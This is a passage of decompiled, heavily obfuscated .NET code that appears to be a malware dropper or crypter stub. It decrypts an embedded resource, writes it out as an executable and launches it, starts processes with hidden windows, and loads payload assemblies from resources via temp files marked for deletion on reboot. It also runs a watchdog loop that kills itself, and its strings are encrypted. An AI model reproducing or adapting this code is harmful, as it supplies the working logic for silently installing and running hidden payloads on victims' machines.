						memoryStream.WriteByte(1);
						memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
						memoryStream.Write(array2, 0, array2.Length);
					}
					catch (CryptographicException)
					{
						try
						{
							byte[] array3 = new byte[16];
							byte[] array4 = default(byte[]);
							if (eDGT3VIwkRhN3e5ONQ())
							{
								switch (0)
								{
								case 0:
									array4 = new byte[16];
									break;
								case 1:
								case 3:
									break;
								default:
									goto IL_0188;
								case 4:
									goto IL_0195;
								case 6:
									goto IL_01a2;
								}
							}
							Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
							Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
							byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
							byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
							byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
							memoryStream.WriteByte(2);
							memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
							goto IL_0188;
							IL_0195:
							memoryStream.Write(array6, 0, array6.Length);
							goto IL_01a2;
							IL_01a2:
							memoryStream.Write(array7, 0, array7.Length);
							goto end_IL_00e4;
							IL_0188:
							memoryStream.Write(array5, 0, array5.Length);
							goto IL_0195;
							end_IL_00e4:;
						}
						catch (CryptographicException)
						{
							Class45.string_0 = Class32.smethod_0(3666);
							return null;
						}
					}
					cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.FlushFinalBlock();
					return memoryStream.ToArray();
				}
				catch (Exception ex3)
				{
					Class45.string_0 = Class32.smethod_0(3872) + ex3.Message;
					return null;
				}
				finally
				{
					rijndaelManaged?.Clear();
					rSACryptoServiceProvider?.Clear();
					memoryStream?.Close();
					cryptoStream?.Close();
				}
			}
		}
		Class45.string_0 = Class32.smethod_0(3573);
		return null;
	}

	static bool smethod_113(Class33.Class40 class40_0)
	{
		return class40_0.int_1 >= 16384;
	}

	static byte[] smethod_114(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class12.smethod_18(byte_1, byte_0, 2, byte_2);
	}

	static object smethod_115(object object_0, string string_0)
	{
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class31.SubkeyApplication);
		if (registryKey == null)
		{
			return object_0;
		}
		return registryKey.GetValue(string_0, object_0);
	}

	static void smethod_116()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text6 = default(string);
		string text7 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				object executablePath;
				string text4;
				string text5;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 493:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_0042;
						case 5:
							goto IL_0061;
						case 6:
							goto IL_00a2;
						case 7:
							goto IL_00ab;
						case 8:
							goto IL_00b9;
						case 9:
							goto IL_00eb;
						case 10:
							goto IL_0100;
						case 11:
							goto IL_011a;
						case 12:
							goto IL_0129;
						case 13:
							goto IL_0136;
						case 14:
							goto IL_0145;
						case 15:
							goto IL_016c;
						case 16:
						case 17:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_016c:
					num = 15;
					Conversion.Int(3405);
					break;
					IL_0008:
					num = 2;
					text = Class32.smethod_0(3889);
					goto IL_0016;
					IL_0016:
					num = 3;
					text2 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1108));
					goto IL_0042;
					IL_0042:
					num = 4;
					if (Operators.CompareString(text, Class12.smethod_38(Class32.smethod_0(3910)), false) != 0)
					{
						goto end_IL_0000_3;
					}
					goto IL_0061;
					IL_0061:
					num = 5;
					text3 = Class32.smethod_0(1013) + Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1047)) + Class32.smethod_0(1013);
					goto IL_00a2;
					IL_00a2:
					num = 6;
					executablePath = Application.get_ExecutablePath();
					goto IL_00ab;
					IL_00ab:
					num = 7;
					text4 = Class32.smethod_0(3943);
					goto IL_00b9;
					IL_00b9:
					num = 8;
					text5 = Class32.smethod_0(1013) + Interaction.Environ(Class12.smethod_38(Class32.smethod_0(3960))) + Class32.smethod_0(3993);
					goto IL_00eb;
					IL_00eb:
					num = 9;
					text6 = Class12.smethod_38(Class32.smethod_0(4002));
					goto IL_0100;
					IL_0100:
					num = 10;
					text7 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(3960)));
					goto IL_011a;
					IL_011a:
					num = 11;
					Conversion.Int(3405);
					goto IL_0129;
					IL_0129:
					num = 12;
					if (Class12.smethod_117(text6))
					{
						break;
					}
					goto IL_0136;
					IL_0136:
					num = 13;
					Conversion.Int(3405);
					goto IL_0145;
					IL_0145:
					num = 14;
					Process.Start(text7 + Class32.smethod_0(1324) + text6 + Class32.smethod_0(4035));
					goto IL_016c;
					end_IL_0000_2:
					break;
				}
				num = 17;
				Conversion.Int(3405);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 493;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static bool smethod_117(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(string_0);
		if (HOU2tiJgKu5JybMaDZ())
		{
		}
		switch (2)
		{
		case 0:
		case 2:
			if (processesByName.Length <= 0)
			{
				return false;
			}
			goto default;
		default:
			return true;
		case 4:
		{
			bool result = default(bool);
			return result;
		}
		}
	}

	static void smethod_118(Class47 class47_0, Exception exception_0)
	{
		using (new Class60(class47_0.xmlWriter_0, Class32.smethod_0(4044)))
		{
			try
			{
				Type type = exception_0.GetType();
				class47_0.method_3(type);
				string value = Class32.smethod_0(4057);
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class47_0.xmlWriter_0.WriteAttributeString(Class32.smethod_0(4062), value);
				string text = exception_0.StackTrace!.Trim();
				class47_0.xmlWriter_0.WriteAttributeString(Class32.smethod_0(4075), text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf(Class32.smethod_0(4104));
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class47_0.xmlWriter_0.WriteAttributeString(Class32.smethod_0(4109), text);
				class47_0.method_1(new Class51(exception_0, firstLevel: true));
			}
			catch
			{
			}
		}
	}

	static void smethod_119(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class12.smethod_138(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	static void smethod_120(Class5.Class10 class10_0)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object executablePath = default(object);
		string text2 = default(string);
		bool flag = default(bool);
		ResourceManager resourceManager = default(ResourceManager);
		string text3 = default(string);
		string text4 = default(string);
		byte[] array = default(byte[]);
		string sourceFileName = default(string);
		string text6 = default(string);
		byte[] byte_ = default(byte[]);
		byte[] array3 = default(byte[]);
		ProcessStartInfo startInfo = default(ProcessStartInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				byte[] array2;
				string text5;
				bool flag2;
				string empty;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 1165:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0017;
						case 4:
							goto IL_0044;
						case 5:
							goto IL_0053;
						case 6:
							goto IL_005c;
						case 7:
							goto IL_0089;
						case 8:
							goto IL_008f;
						case 9:
							goto IL_0110;
						case 10:
						case 11:
							goto IL_0117;
						case 12:
							goto IL_0131;
						case 13:
							goto IL_015f;
						case 14:
						case 15:
							goto IL_0178;
						case 16:
							goto IL_019c;
						case 17:
							goto IL_01a2;
						case 18:
							goto IL_01b8;
						case 19:
							goto IL_01c8;
						case 21:
							goto IL_01d0;
						case 22:
							goto IL_01d4;
						case 23:
							goto IL_01e4;
						case 25:
							goto IL_0202;
						case 20:
						case 24:
						case 26:
						case 27:
						case 28:
							goto IL_0206;
						case 29:
							goto IL_0216;
						case 30:
							goto IL_0253;
						case 31:
							goto IL_025f;
						case 32:
							goto IL_0265;
						case 33:
							goto IL_026f;
						case 34:
							goto IL_0292;
						case 35:
							goto IL_02ae;
						case 36:
							goto IL_02ca;
						case 37:
						case 38:
							goto IL_02ce;
						case 39:
							goto IL_02de;
						case 40:
							goto IL_02e7;
						case 41:
							goto IL_030e;
						case 42:
							goto IL_032a;
						case 43:
							goto IL_0336;
						case 44:
							goto IL_0348;
						case 45:
							goto IL_0356;
						case 46:
							goto IL_0393;
						case 47:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 48:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0393:
					num = 46;
					Conversion.Int((object)false);
					break;
					IL_0008:
					num = 2;
					Conversion.Int((object)false);
					goto IL_0017;
					IL_0017:
					num = 3;
					text = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1108));
					goto IL_0044;
					IL_0044:
					num = 4;
					Conversion.Int((object)false);
					goto IL_0053;
					IL_0053:
					num = 5;
					executablePath = Application.get_ExecutablePath();
					goto IL_005c;
					IL_005c:
					num = 6;
					text2 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1047));
					goto IL_0089;
					IL_0089:
					num = 7;
					flag = false;
					goto IL_008f;
					IL_008f:
					num = 8;
					if (Operators.ConditionalCompareObjectEqual((object)(text2 + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(1324) + Class12.smethod_38(Class32.smethod_0(1258)) + Class32.smethod_0(1013)), Operators.ConcatenateObject(Operators.ConcatenateObject(executablePath, (object)Class32.smethod_0(1013)), (object)Class32.smethod_0(1013)), false))
					{
						goto IL_0110;
					}
					goto IL_0117;
					IL_0110:
					num = 9;
					flag = true;
					goto IL_0117;
					IL_0117:
					num = 11;
					resourceManager = new ResourceManager(Class32.smethod_0(4118), Assembly.GetExecutingAssembly());
					goto IL_0131;
					IL_0131:
					num = 12;
					text3 = Class32.smethod_0(1013) + Interaction.Environ(Class32.smethod_0(1858)) + Class32.smethod_0(1013);
					goto IL_015f;
					IL_015f:
					num = 13;
					Class12.smethod_117(Class12.smethod_38(Class32.smethod_0(4143)));
					goto IL_0178;
					IL_0178:
					num = 15;
					text4 = Class12.smethod_38(Class32.smethod_0(4176)) + Class32.smethod_0(4035);
					goto IL_019c;
					IL_019c:
					num = 16;
					array = array;
					goto IL_01a2;
					IL_01a2:
					num = 17;
					array2 = Class12.smethod_87(Class32.smethod_0(4209), array);
					goto IL_01b8;
					IL_01b8:
					num = 18;
					Conversion.Int((object)false);
					goto IL_01c8;
					IL_01c8:
					num = 19;
					if (!flag)
					{
						goto IL_01d0;
					}
					goto IL_0206;
					IL_01d0:
					num = 21;
					goto IL_01d4;
					IL_01d4:
					num = 22;
					Conversion.Int((object)false);
					goto IL_01e4;
					IL_01e4:
					num = 23;
					if (!Operators.ConditionalCompareObjectEqual(executablePath, (object)(text2 + Class32.smethod_0(4230)), false))
					{
						goto IL_0202;
					}
					goto IL_0206;
					IL_0202:
					num = 25;
					goto IL_0206;
					IL_0206:
					num = 28;
					text5 = Class32.smethod_0(1013);
					goto IL_0216;
					IL_0216:
					num = 29;
					sourceFileName = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(3960))) + Class12.smethod_38(Class32.smethod_0(4259)) + Class12.smethod_38(Class32.smethod_0(4320));
					goto IL_0253;
					IL_0253:
					num = 30;
					Conversion.Int(31);
					goto IL_025f;
					IL_025f:
					num = 31;
					flag2 = false;
					goto IL_0265;
					IL_0265:
					num = 32;
					empty = string.Empty;
					goto IL_026f;
					IL_026f:
					num = 33;
					text6 = Class32.smethod_0(1013) + text3 + Class32.smethod_0(1324) + text4;
					goto IL_0292;
					IL_0292:
					num = 34;
					byte_ = (byte[])resourceManager.GetObject(Class32.smethod_0(4353));
					goto IL_02ae;
					IL_02ae:
					num = 35;
					array3 = Class12.smethod_87(Class12.smethod_38(Class32.smethod_0(4378)), byte_);
					goto IL_02ca;
					IL_02ca:
					num = 36;
					goto IL_02ce;
					IL_02ce:
					num = 38;
					Conversion.Int((object)true);
					goto IL_02de;
					IL_02de:
					num = 39;
					Class12.smethod_32();
					goto IL_02e7;
					IL_02e7:
					num = 40;
					((ServerComputer)Class2.Computer).get_FileSystem().WriteAllBytes(text2 + Class32.smethod_0(4467), array3, false);
					goto IL_030e;
					IL_030e:
					num = 41;
					startInfo = new ProcessStartInfo(text2 + Class32.smethod_0(4467));
					goto IL_032a;
					IL_032a:
					num = 42;
					Process.Start(startInfo);
					goto IL_0336;
					IL_0336:
					num = 43;
					File.Delete(text2 + text4);
					goto IL_0348;
					IL_0348:
					num = 44;
					File.Copy(sourceFileName, text6, overwrite: true);
					goto IL_0356;
					IL_0356:
					num = 45;
					Class12.smethod_152(new object[5]
					{
						string.Empty,
						array3,
						false,
						false,
						text6
					});
					goto IL_0393;
					end_IL_0000_2:
					break;
				}
				num = 47;
				Thread.Sleep(10000);
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1165;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.Dll")]
	internal static extern void GetSystemInfo(ref Class59.Struct25 struct25_0);

	static void smethod_121(Class33.Class36 class36_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class36_0.byte_0[class36_0.int_0++] = class36_0.byte_0[int_0++];
			class36_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_122()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ProcessStartInfo processStartInfo = default(ProcessStartInfo);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text;
				string text3;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 268:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0034;
						case 4:
							goto IL_0060;
						case 5:
							goto IL_006e;
						case 6:
							goto IL_0082;
						case 7:
							goto IL_00aa;
						case 8:
							goto IL_00b4;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00b4:
					num = 8;
					processStartInfo.CreateNoWindow = true;
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1108));
					goto IL_0034;
					IL_0034:
					num = 3;
					text2 = Interaction.Environ(Class12.smethod_38(Class32.smethod_0(1014))) + Class12.smethod_38(Class32.smethod_0(1047));
					goto IL_0060;
					IL_0060:
					num = 4;
					text3 = Class32.smethod_0(4480);
					goto IL_006e;
					IL_006e:
					num = 5;
					if (Class12.smethod_117(Class32.smethod_0(4485)))
					{
						goto end_IL_0000_3;
					}
					goto IL_0082;
					IL_0082:
					num = 6;
					processStartInfo = new ProcessStartInfo(text2 + Class12.smethod_38(Class32.smethod_0(1291)) + Class32.smethod_0(4490));
					goto IL_00aa;
					IL_00aa:
					num = 7;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					goto IL_00b4;
					end_IL_0000_2:
					break;
				}
				num = 9;
				Process.Start(processStartInfo);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 268;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static Assembly smethod_123(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Class26.Struct13 @struct = new Class26.Struct13(resolveEventArgs_0.Name);
		string s = @struct.method_0(bool_0: false);
		string text = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
		string[] array = "ezliNTRlYjBiLTA5MzgtNGYzZi1hY2RjLTJmN2U5ODNkNjM3NH0sIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49M2U1NjM1MDY5M2Y3MzU1ZQ==,[z]{d3f2602f-aa4d-4aee-bc70-eb492fdb1421},ezliNTRlYjBiLTA5MzgtNGYzZi1hY2RjLTJmN2U5ODNkNjM3NH0=,[z]{d3f2602f-aa4d-4aee-bc70-eb492fdb1421}".Split(new char[1] { ',' });
		string text2 = string.Empty;
		bool flag = false;
		bool flag2 = false;
		for (int i = 0; i < array.Length - 1; i += 2)
		{
			if (array[i] == text)
			{
				text2 = array[i + 1];
				break;
			}
		}
		if (text2.Length == 0 && @struct.string_2.Length == 0)
		{
			text = Convert.ToBase64String(Encoding.UTF8.GetBytes(@struct.string_0));
			for (int j = 0; j < array.Length - 1; j += 2)
			{
				if (array[j] == text)
				{
					text2 = array[j + 1];
					break;
				}
			}
		}
		if (text2.Length > 0)
		{
			if (text2[0] == '[')
			{
				int num = text2.IndexOf(']');
				string text3 = text2.Substring(1, num - 1);
				flag = text3.IndexOf('z') >= 0;
				flag2 = text3.IndexOf('t') >= 0;
				text2 = text2.Substring(num + 1);
			}
			Assembly result;
			lock (Class26.dictionary_0)
			{
				if (Class26.dictionary_0.ContainsKey(text2))
				{
					result = Class26.dictionary_0[text2];
				}
				else
				{
					Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(text2);
					if (manifestResourceStream == null)
					{
						goto IL_02a0;
					}
					int num2 = (int)manifestResourceStream.Length;
					byte[] array2 = new byte[num2];
					manifestResourceStream.Read(array2, 0, num2);
					if (flag)
					{
						array2 = Class12.smethod_2(array2);
					}
					Assembly assembly = null;
					if (!flag2)
					{
						try
						{
							assembly = Assembly.Load(array2);
						}
						catch (FileLoadException)
						{
							flag2 = true;
						}
						catch (BadImageFormatException)
						{
							flag2 = true;
						}
					}
					if (flag2)
					{
						try
						{
							string text4 = $"{Path.GetTempPath()}{text2}\\";
							while (true)
							{
								Directory.CreateDirectory(text4);
								string text5 = text4 + @struct.string_0 + ".dll";
								while (true)
								{
									IL_022d:
									if (!File.Exists(text5))
									{
										while (true)
										{
											FileStream fileStream = File.OpenWrite(text5);
											fileStream.Write(array2, 0, array2.Length);
											fileStream.Close();
											if (eDGT3VIwkRhN3e5ONQ())
											{
												switch (4)
												{
												case 3:
													goto IL_022d;
												case 0:
												case 5:
													goto end_IL_022d;
												case 4:
													MoveFileEx(text5, null, 4);
													MoveFileEx(text4, null, 4);
													goto end_IL_01e0;
												case 6:
													goto end_IL_01e0;
												}
												continue;
											}
											break;
											continue;
											end_IL_01e0:
											break;
										}
									}
									assembly = Assembly.LoadFile(text5);
									goto end_IL_0238;
									continue;
									end_IL_022d:
									break;
								}
								continue;
								end_IL_0238:
								break;
							}
						}
						catch
						{
						}
					}
					Class26.dictionary_0[text2] = assembly;
					result = assembly;
				}
			}
			return result;
		}
		goto IL_02a0;
		IL_02a0:
		return null;
	}

	static int smethod_124(byte[] byte_0, Class33.Class39 class39_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		int num6 = default(int);
		while (true)
		{
			int num3 = num2;
			while (true)
			{
				int num4 = Class12.smethod_149(class39_0.class43_0, byte_0, num, num2);
				while (true)
				{
					IL_00c1:
					num += num4;
					while (true)
					{
						class39_0.long_0 += num4;
						num2 -= num4;
						if (num2 != 0 && class39_0.int_0 != 30)
						{
							Class33.Class42 class42_ = class39_0.class42_0;
							bool bool_ = (class39_0.int_0 & 4) != 0;
							bool bool_2 = (class39_0.int_0 & 8) != 0;
							if (Class12.smethod_74(bool_, bool_2, class42_))
							{
								break;
							}
							if (class39_0.int_0 == 16)
							{
								int num5 = 8;
								if (!eDGT3VIwkRhN3e5ONQ())
								{
									goto IL_011d;
								}
								while (true)
								{
									switch (num5)
									{
									default:
										num5 = 0;
										if (!HOU2tiJgKu5JybMaDZ())
										{
										}
										continue;
									case 1:
									case 2:
										break;
									case 3:
										goto IL_00c1;
									case 0:
										goto IL_00fa;
									case 7:
										goto IL_0112;
									case 5:
									case 6:
										goto IL_011d;
									case 9:
										goto end_IL_00a3;
									case 4:
										goto end_IL_0125;
									case 8:
										return num3 - num2;
									}
									break;
								}
								continue;
							}
							if (class39_0.int_0 == 20)
							{
								num6 = 8 + (-class39_0.class43_0.BitCount & 7);
								goto IL_00fa;
							}
							if (class39_0.int_0 != 28)
							{
								break;
							}
							goto IL_0112;
						}
						return num3 - num2;
						IL_011d:
						class39_0.int_0 = 30;
						break;
						IL_00fa:
						while (num6 > 0)
						{
							Class12.smethod_144(class39_0.class43_0, 2, 10);
							num6 -= 10;
						}
						class39_0.int_0 = 16;
						break;
						IL_0112:
						Class12.smethod_90(class39_0.class43_0);
						goto IL_011d;
						continue;
						end_IL_00a3:
						break;
					}
					break;
				}
				continue;
				end_IL_0125:
				break;
			}
		}
	}

	static void smethod_125(Class33.Class40.Class41 class41_0, int[] int_0)
	{
		class41_0.byte_0 = new byte[class41_0.short_0.Length];
		int num5 = default(int);
		int num6 = default(int);
		int num11 = default(int);
		int num9 = default(int);
		while (true)
		{
			int num = int_0.Length / 2;
			while (true)
			{
				int num2 = (num + 1) / 2;
				int num3 = 0;
				for (int i = 0; i < class41_0.int_3; i++)
				{
					class41_0.int_2[i] = 0;
				}
				int[] array = new int[num];
				while (true)
				{
					array[num - 1] = 0;
					int num4 = num - 1;
					while (true)
					{
						if (num4 >= 0)
						{
							if (int_0[2 * num4 + 1] == -1)
							{
								num5 = array[num4];
								goto IL_008b;
							}
							num6 = array[num4] + 1;
						}
						else
						{
							if (num3 == 0)
							{
								return;
							}
							int num7 = class41_0.int_3 - 1;
							while (true)
							{
								IL_01e8:
								if (class41_0.int_2[--num7] == 0)
								{
									continue;
								}
								while (true)
								{
									IL_01c1:
									class41_0.int_2[num7]--;
									int num8 = 5;
									if (!eDGT3VIwkRhN3e5ONQ())
									{
										break;
									}
									while (true)
									{
										switch (num8)
										{
										case 0:
										case 3:
											break;
										case 12:
											goto IL_008b;
										case 7:
											goto IL_00a7;
										case 9:
											num3 -= 1 << class41_0.int_3 - 1 - num7;
											if (num3 > 0 && num7 < class41_0.int_3 - 1)
											{
												goto IL_01c1;
											}
											if (num3 > 0)
											{
												goto IL_01e8;
											}
											class41_0.int_2[class41_0.int_3 - 1] += num3;
											class41_0.int_2[class41_0.int_3 - 2] -= num3;
											num11 = 2 * num2;
											num8 = 6;
											if (eDGT3VIwkRhN3e5ONQ())
											{
												continue;
											}
											goto end_IL_020b;
										case 5:
											class41_0.int_2[++num7]++;
											goto case 9;
										default:
											goto IL_01c1;
										case 1:
										case 2:
											goto end_IL_01fe;
										case 11:
											goto end_IL_020b;
										case 8:
											goto end_IL_021a;
										case 6:
											num9 = class41_0.int_3;
											goto case 10;
										case 10:
										case 13:
											while (num9 != 0)
											{
												int num10 = class41_0.int_2[num9 - 1];
												while (num10 > 0)
												{
													int num12 = 2 * int_0[num11++];
													if (int_0[num12 + 1] == -1)
													{
														class41_0.byte_0[int_0[num12]] = (byte)num9;
														num10--;
													}
												}
												num9--;
											}
											return;
										}
										break;
									}
									break;
								}
								break;
							}
						}
						if (num6 > class41_0.int_3)
						{
							num6 = class41_0.int_3;
							num3++;
						}
						array[int_0[2 * num4]] = (array[int_0[2 * num4 + 1]] = num6);
						goto IL_00ba;
						IL_008b:
						class41_0.int_2[num5 - 1]++;
						goto IL_00a7;
						IL_00ba:
						num4--;
						continue;
						IL_00a7:
						class41_0.byte_0[int_0[2 * num4]] = (byte)array[num4];
						goto IL_00ba;
						continue;
						end_IL_01fe:
						break;
					}
					continue;
					end_IL_020b:
					break;
				}
				continue;
				end_IL_021a:
				break;
			}
		}
	}

	static string smethod_126(object object_0)
	{
		try
		{
			if (object_0 == null)
			{
				return string.Empty;
			}
			if (object_0 is int num)
			{
				return num.ToString(Class32.smethod_0(4531));
			}
			long num2 = default(long);
			if (object_0 is long)
			{
				num2 = (long)object_0;
				goto IL_01ca;
			}
			if (object_0 is short num3)
			{
				return num3.ToString(Class32.smethod_0(4531));
			}
			if (object_0 is uint num4)
			{
				return num4.ToString(Class32.smethod_0(4531));
			}
			ulong num5 = default(ulong);
			if (object_0 is ulong)
			{
				num5 = (ulong)object_0;
				goto IL_01de;
			}
			if (object_0 is ushort)
			{
				goto IL_01ae;
			}
			if (object_0 is byte b)
			{
				return b.ToString(Class32.smethod_0(4531));
			}
			if (object_0 is sbyte b2)
			{
				return b2.ToString(Class32.smethod_0(4531));
			}
			if (object_0 is IntPtr intPtr)
			{
				return intPtr.ToInt64().ToString(Class32.smethod_0(4531));
			}
			if (object_0 is UIntPtr)
			{
				UIntPtr uIntPtr = (UIntPtr)object_0;
				while (true)
				{
					ulong num6 = uIntPtr.ToUInt64();
					while (true)
					{
						string result = num6.ToString(Class32.smethod_0(4531));
						if (!eDGT3VIwkRhN3e5ONQ())
						{
							break;
						}
						switch (11)
						{
						case 8:
						case 9:
							break;
						case 5:
						case 7:
							goto end_IL_0145;
						case 4:
							goto end_IL_019b;
						case 6:
							goto IL_01ca;
						case 10:
							goto IL_01de;
						default:
							return result;
						case 0:
							return result;
						case 1:
							return result;
						case 2:
							return result;
						case 3:
							return result;
						case 11:
							return result;
						}
						continue;
						end_IL_0145:
						break;
					}
					continue;
					end_IL_019b:
					break;
				}
				goto IL_01ae;
			}
			goto end_IL_0000;
			IL_01ae:
			return ((ushort)object_0).ToString(Class32.smethod_0(4531));
			IL_01de:
			return num5.ToString(Class32.smethod_0(4531));
			IL_01ca:
			return num2.ToString(Class32.smethod_0(4531));
			end_IL_0000:;
		}
		catch
		{
		}
		return string.Empty;
	}

	static void smethod_127(int int_0)
	{
		while (true)
		{
			try
			{
				Process.GetProcessById(int_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process.GetCurrentProcess().Kill();
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(2000);
			GC.Collect();
		}
	}

	static void smethod_128(int int_0, Class33.Class40 class40_0)
	{
		Class12.smethod_96(class40_0.class41_2);
		Class33.Class40.Class41 class41_2 = default(Class33.Class40.Class41);
		Class33.Class40.Class41 class41_ = default(Class33.Class40.Class41);
		while (true)
		{
			Class12.smethod_96(class40_0.class41_0);
			Class12.smethod_96(class40_0.class41_1);
			Class12.smethod_144(class40_0.class43_0, class40_0.class41_0.int_1 - 257, 5);
			Class12.smethod_144(class40_0.class43_0, class40_0.class41_1.int_1 - 1, 5);
			Class12.smethod_144(class40_0.class43_0, int_0 - 4, 4);
			int num = 0;
			while (true)
			{
				if (num < int_0)
				{
					Class12.smethod_144(class40_0.class43_0, (int)class40_0.class41_2.byte_0[Class33.Class40.int_0[num]], 3);
					if (!HOU2tiJgKu5JybMaDZ())
					{
						switch (2)
						{
						case 2:
							num++;
							break;
						case 1:
						case 3:
							break;
						case 0:
						case 6:
							goto end_IL_0066;
						default:
							goto IL_00ce;
						case 5:
							goto IL_00d5;
						case 7:
							goto IL_00f1;
						}
						continue;
					}
					goto IL_00f1;
				}
				goto IL_00ce;
				IL_00d5:
				class41_ = class40_0.class41_2;
				Class12.smethod_36(class41_, class41_2);
				class41_2 = class40_0.class41_1;
				class41_ = class40_0.class41_2;
				goto IL_00f1;
				IL_00f1:
				Class12.smethod_36(class41_, class41_2);
				return;
				IL_00ce:
				class41_2 = class40_0.class41_0;
				goto IL_00d5;
				continue;
				end_IL_0066:
				break;
			}
		}
	}

	static void smethod_129(Class46 class46_0, IWebProxy iwebProxy_0)
	{
		class46_0.iwebProxy_0 = iwebProxy_0;
	}

	static void smethod_130(int int_0, Class33.Class43 class43_0)
	{
		class43_0.byte_0[class43_0.int_1++] = (byte)int_0;
		class43_0.byte_0[class43_0.int_1++] = (byte)(int_0 >> 8);
	}

	static void smethod_131()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
